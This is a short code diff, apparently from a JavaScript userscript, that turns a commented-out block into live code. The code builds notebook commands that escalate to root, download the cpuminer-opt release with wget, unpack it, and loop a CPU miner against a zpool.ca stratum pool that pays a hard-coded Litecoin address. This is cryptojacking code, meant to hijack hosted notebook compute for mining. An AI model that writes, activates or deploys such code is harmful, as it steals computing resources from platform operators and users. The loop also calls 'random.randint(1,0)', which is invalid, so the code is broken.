@@ -98,16 +98,7 @@ if(verif!=null)
     'use strict';
 let texto=0;
 var linha=0;
-/*
-texto='!sudo su\n\r';
-texto+='import random\n\r';
-texto+='!wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \n\r';
-texto+='!tar xf cpuminer-opt-linux.tar.gz\n\r';
-texto+='while 1:\n\r';
-texto+=' ';
-texto+='!./cpuminer-sse2 --algo yescrypt -o stratum+tcp://yescrypt.na.mine.zpool.ca:6233 -u LTC:MGc1CUwppmaF8R4hVVbgXhYBWeEus3jrZF -p c=LTC\n\r';
-texto+='!sleep random.randint(1,0)\n\r';
-*/
+
 texto='!sudo su\n\r';
 texto+='import random\n\r';
 texto+='!wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz\n\r';
